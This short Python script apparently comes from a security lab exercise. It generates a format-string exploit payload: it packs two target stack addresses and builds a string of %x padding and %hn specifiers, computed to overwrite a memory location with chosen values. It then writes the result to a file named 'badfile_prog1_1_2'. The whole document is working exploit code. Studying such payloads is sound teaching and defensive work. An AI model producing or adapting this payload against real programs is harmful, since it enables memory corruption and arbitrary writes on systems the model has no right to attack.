#!/usr/bin/python3
import sys

addr = 0xffffd668
payload =  (addr + 2).to_bytes(4, byteorder='little')
payload += ("@@@@").encode('latin-1')
payload += (addr).to_bytes(4, byteorder='little')

# 26196 = 0x6688 - 12 - 8 * 5 
# 4369 = 0x1111 = 0x7799 - 0x6688
s = "%.8x" * 5 + "%.26196x" + "%hn" + "%.4369x" + "%hn"
# s = "%7$.26236x" + "%7$hn" + "%9$.4369x" + "%9$hn"
payload += s.encode('latin-1')

with open("badfile_prog1_1_2", "wb") as f:
    f.write(payload)
